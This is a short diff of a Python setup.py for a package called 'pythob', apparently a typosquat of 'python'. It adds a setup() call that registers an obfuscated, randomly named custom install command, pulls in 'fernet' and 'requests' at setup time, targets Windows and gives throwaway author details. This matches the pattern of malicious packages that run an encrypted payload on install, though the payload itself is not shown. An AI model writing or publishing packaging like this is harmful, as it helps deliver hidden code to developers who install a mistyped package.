@@ -18,5 +18,22 @@ class sfelxgskmQcVmGfcAUPfBfXGQRtGoWdirpcHncSdkorCwGKAhoYkPVrhbEKrxefZdDLNKrCZro
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="pythob",
+    version=VERSION,
+    author="DAdPS",
+    author_email="HWlvKUVjewdARIY@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': sfelxgskmQcVmGfcAUPfBfXGQRtGoWdirpcHncSdkorCwGKAhoYkPVrhbEKrxefZdDLNKrCZroRATVvzamWQiWTEjkzAoBJZVLKHNhmKGtkofsGJVMwFMWhqVkeWicGTIfGyeDuM,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
